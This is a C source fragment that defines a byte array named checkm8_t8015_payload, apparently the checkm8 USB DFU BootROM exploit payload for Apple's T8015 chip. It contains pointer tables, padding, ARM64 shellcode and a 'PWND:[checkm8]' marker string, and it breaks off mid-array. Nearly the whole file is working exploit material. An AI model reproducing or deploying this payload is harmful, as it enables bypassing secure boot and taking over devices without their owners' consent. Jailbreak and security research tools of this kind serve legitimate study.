#include <io/iousb.h>
#include <common/common.h>
#include <common/log.h>

#define MAX_RETRY_STALL (10000)

static unsigned char blank[DFU_MAX_TRANSFER_SZ];

static unsigned char checkm8_t8015_payload[] = {
    0xf8, 0x03, 0x02, 0x80, 0x01, 0x00, 0x00, 0x00, 0xa5, 0x06, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0xf8, 0x05, 0x02, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x25, 0x06, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0xf8, 0xc5, 0x00, 0x80,
    0x01, 0x00, 0x00, 0x00, 0x25, 0x06, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x30, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x40, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00,
    0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x50, 0xc0, 0x01, 0x80,
    0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x60, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0xc0, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x00, 0xc8, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00, 0xd0, 0x04, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x40, 0xc8, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00,
    0xd0, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x80, 0xc8, 0x01, 0x80,
    0x01, 0x00, 0x00, 0x00, 0xd0, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x04, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x0d, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xec, 0x03, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0xd0, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00,
    0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xe0, 0xc0, 0x01, 0x80,
    0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xf0, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0xc1, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00,
    0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x60, 0xc1, 0x01, 0x80,
    0x01, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x5c, 0x94, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x10, 0xc0, 0x01, 0x80,
    0x01, 0x00, 0x00, 0x00, 0x5c, 0x94, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x02, 0x80, 0x01, 0x00, 0x00, 0x00, 0x5c, 0x04, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xac, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x20, 0xc0, 0x01, 0x80,
    0x01, 0x00, 0x00, 0x00, 0x5c, 0x94, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x70, 0xc1, 0x01, 0x80,
    0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x80, 0xc1, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00, 0xac, 0xa9, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x80,
    0x01, 0x00, 0x00, 0x00, 0x5c, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xac, 0x04, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xc8, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x80, 0xd2,
    0xfd, 0x7b, 0xbf, 0xa9, 0xfd, 0x03, 0x00, 0x91, 0xe0, 0x07, 0x00, 0x58,
    0x00, 0x04, 0x40, 0xa9, 0x02, 0x06, 0x00, 0x10, 0x43, 0x10, 0x40, 0xa9,
    0x03, 0x10, 0x00, 0xa9, 0x23, 0x10, 0x00, 0xa9, 0x43, 0x10, 0x41, 0xa9,
    0x03, 0x10, 0x01, 0xa9, 0x23, 0x10, 0x01, 0xa9, 0x00, 0x07, 0x00, 0x58,
    0x00, 0x04, 0x00, 0x91, 0x01, 0x00, 0x40, 0x39, 0xc1, 0xff, 0xff, 0x35,
    0xa1, 0x05, 0x00, 0x10, 0x22, 0x0c, 0x40, 0xa9, 0x02, 0x0c, 0x00, 0xa9,
    0x20, 0x06, 0x00, 0x58, 0x41, 0x06, 0x00, 0x58, 0x20, 0x00, 0x3f, 0xd6,
    0x41, 0x06, 0x00, 0x58, 0x20, 0x00, 0x00, 0x39, 0x40, 0x06, 0x00, 0x58,
    0xe1, 0xfc, 0xff, 0x10, 0x42, 0x06, 0x00, 0x58, 0x21, 0x00, 0x02, 0x8b,
    0x02, 0x00, 0x80, 0xd2, 0x23, 0x06, 0x00, 0x58, 0x44, 0x06, 0x00, 0x58,
    0x05, 0x60, 0x00, 0x91, 0x85, 0x00, 0x00, 0xf9, 0x23, 0x10, 0x40, 0xa9,
    0x03, 0x10, 0x00, 0xa9, 0x23, 0x10, 0x41, 0xa9, 0x03, 0x10, 0x01, 0xa9,
    0x23, 0x10, 0x42, 0xa9, 0x03, 0x10, 0x02, 0xa9, 0x23, 0x10, 0x43, 0xa9,
    0x03, 0x10, 0x03, 0xa9, 0x20, 0x7e, 0x0b, 0xd5, 0xbf, 0x3f, 0x03, 0xd5,
    0x00, 0x00, 0x01, 0x91, 0x21, 0x00, 0x01, 0x91, 0x42, 0x00, 0x01, 0x91,
    0x5f, 0x00, 0x03, 0xeb, 0x43, 0xfe, 0xff, 0x54, 0x1f, 0x75, 0x08, 0xd5,
    0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5, 0xfd, 0x7b, 0xc1, 0xa8,
    0xc0, 0x03, 0x5f, 0xd6, 0x09, 0x02, 0x19, 0x00, 0x01, 0x01, 0x05, 0x80,
    0xfa, 0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01, 0x00, 0x00, 0x07, 0x21,
    0x01, 0x0a, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x20, 0x50, 0x57, 0x4e, 0x44, 0x3a, 0x5b, 0x63, 0x68, 0x65, 0x63, 0x6b,
    0x6d, 0x38, 0x5d, 0x00, 0x1f, 0x20, 0x03, 0xd5, 0x28, 0x85, 0x00, 0x80,
    0x01, 0x00, 0x00, 0x00, 0x78, 0x3a, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x80, 0xae, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xfa, 0x08, 0x00, 0x80,
    0x01, 0x00, 0x00, 0x00, 0x00, 0xbc, 0x01, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x02, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x38, 0x86, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x47, 0x00, 0x00, 0x58,
    0xe0, 0x00, 0x1f, 0xd6, 0xcc, 0xbc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xfc, 0xff, 0xff, 0x17, 0x20, 0x00, 0x20, 0xd4, 0x02, 0x00, 0x40, 0x79,
    0x5f, 0x84, 0x0a, 0x71, 0x81, 0xff, 0xff, 0x54, 0xfd, 0x7b, 0xbf, 0xa9,
    0xfd, 0x03, 0x00, 0x91, 0xf4, 0x4f, 0xbf, 0xa9, 0xf3, 0x03, 0x00, 0xaa,
    0xf4, 0x0d, 0x00, 0x58, 0xe1, 0xff, 0x9f, 0x52, 0x62, 0x06, 0x40, 0x79,
    0x3f, 0x00, 0x02, 0x6b, 0xe1, 0x04, 0x00, 0x54, 0x80, 0x02, 0x40, 0xf9,
    0x61, 0x0d, 0x00, 0x58, 0x1f, 0x00, 0x01, 0xeb, 0xe1, 0x01, 0x00, 0x54,
    0x9f, 0x02, 0x00, 0xf9, 0x80, 0x0a, 0x40, 0xf9, 0x81, 0x0e, 0x40, 0xf9,
    0x82, 0x12, 0x40, 0xf9, 0x83, 0x16, 0x40, 0xf9, 0x84, 0x1a, 0x40, 0xf9,
    0x85, 0x1e, 0x40, 0xf9, 0x86, 0x22, 0x40, 0xf9, 0x87, 0x22, 0x40, 0xf9,
    0x88, 0x06, 0x40, 0xf9, 0x00, 0x01, 0x3f, 0xd6, 0xe8, 0x0b, 0x00, 0x58,
    0x88, 0x02, 0x00, 0xa9, 0x15, 0x00, 0x00, 0x14, 0xc1, 0x0b, 0x00, 0x58,
    0x1f, 0x00, 0x01, 0xeb, 0x01, 0x01, 0x00, 0x54, 0x9f, 0x02, 0x00, 0xf9,
    0x80, 0x06, 0x41, 0xa9, 0x82, 0x12, 0x40, 0xf9, 0x32, 0x00, 0x00, 0x94,
    0xa8, 0x0a, 0x00, 0x58, 0x88, 0x02, 0x00, 0xf9, 0x0b, 0x00, 0x00, 0x14,
    0xc1, 0x0a, 0x00, 0x58, 0x1f, 0x00, 0x01, 0xeb, 0x01, 0x01, 0x00, 0x54,
    0x9f, 0x02, 0x00, 0xf9, 0x80, 0x06, 0x41, 0xa9, 0x82, 0x12, 0x40, 0xf9,
    0x0e, 0x00, 0x00, 0x94, 0x68, 0x09, 0x00, 0x58, 0x88, 0x02, 0x00, 0xf9,
    0x01, 0x00, 0x00, 0x14, 0x00, 0x10, 0x80, 0x52, 0xe1, 0x03, 0x14, 0xaa,
    0x62, 0x0e, 0x40, 0x79, 0x03, 0x00, 0x80, 0xd2, 0x44, 0x09, 0x00, 0x58,
    0x80, 0x00, 0x3f, 0xd6, 0x00, 0x00, 0x80, 0x52, 0xf4, 0x4f, 0xc1, 0xa8,
    0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6, 0xe3, 0xc3, 0x00, 0xb2,
    0x21, 0x1c, 0x40, 0x92, 0x21, 0x7c, 0x03, 0x9b, 0xe3, 0x03, 0x00, 0xaa,
    0x5f, 0x20, 0x00, 0xf1, 0xa3, 0x00, 0x00, 0x54, 0x01, 0x00, 0x00, 0xf9,
    0x00, 0x20, 0x00, 0x91, 0x42, 0x20, 0x00, 0xd1, 0xfb, 0xff, 0xff, 0x17,
    0x5f, 0x10, 0x00, 0xf1, 0x83, 0x00, 0x00, 0x54, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0x42, 0x10, 0x00, 0xd1, 0x5f, 0x08, 0x00, 0xf1,
    0x83, 0x00, 0x00, 0x54, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x08, 0x00, 0x91,
    0x42, 0x08, 0x00, 0xd1, 0x82, 0x00, 0x00, 0xb4, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x04, 0x00, 0x91, 0x42, 0x04, 0x00, 0xd1, 0xe0, 0x03, 0x03, 0xaa,
    0xc0, 0x03, 0x5f, 0xd6, 0xe4, 0x03, 0x00, 0xaa, 0x5f, 0x20, 0x00, 0xf1,
    0xe3, 0x00, 0x00, 0x54, 0x23, 0x00, 0x40, 0xf9, 0x03, 0x00, 0x00, 0xf9,
    0x00, 0x20, 0x00, 0x91, 0x21, 0x20, 0x00, 0x91, 0x42, 0x20, 0x00, 0xd1,
    0xf9, 0xff, 0xff, 0x17, 0x5f, 0x10, 0x00, 0xf1, 0xc3, 0x00, 0x00, 0x54,
    0x23, 0x00, 0x40, 0xb9, 0x03, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x21, 0x10, 0x00, 0x91, 0x42, 0x10, 0x00, 0xd1, 0x5f, 0x08, 0x00, 0xf1,
